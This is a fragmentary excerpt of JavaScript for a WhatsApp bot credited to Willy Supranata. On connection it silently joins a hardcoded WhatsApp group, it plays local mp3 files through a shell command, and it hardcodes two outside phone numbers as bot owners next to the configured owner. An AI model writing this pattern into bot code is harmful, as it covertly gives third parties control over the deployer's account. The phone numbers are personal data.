...
denz.autoReconnect = ReconnectMode.onConnectionLost
 ...
 teks = `https://chat.whatsapp.com/HDxXtpFC3oF51vO9SNgvzi`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to WiZ BOT Official Group', 'cyan'))
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   denz.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6282138919347@s.whatsapp.net","6283125187277@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping(' Created By Willy Supranata' ,{ flashStyle: term.brightWhite })
